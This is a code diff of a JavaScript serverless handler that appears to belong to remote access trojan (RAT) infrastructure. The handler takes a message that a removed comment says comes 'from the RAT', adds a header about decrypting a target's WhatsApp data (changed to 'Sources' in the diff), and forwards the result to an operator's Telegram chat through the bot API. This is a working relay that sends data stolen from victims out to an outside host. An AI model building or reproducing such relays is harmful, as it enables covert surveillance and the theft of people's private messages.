@@ -23,14 +23,12 @@ export default async function handler(request, response) {
     }
 
     try {
-        // Step 1: Clean the message from the RAT
         const cleanedMessage = preFormattedMessage
             .replace(/\*\*/g, '')          
             .replace(/SENT/g, 'send')           
             .replace(/RECEIVED/g, 'Received'); 
 
-        // Step 2: Add your custom header on top
-        const finalMessage = `Terget Whatsapp decrypting 💀🥀\n\n${cleanedMessage}`;
+        const finalMessage = `Terget Sources decrypting 💀🥀\n\n${cleanedMessage}`;
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
@@ -39,7 +37,7 @@ export default async function handler(request, response) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: finalMessage, // Sending the final message with the header
+                text: finalMessage,
             }),
         });
         
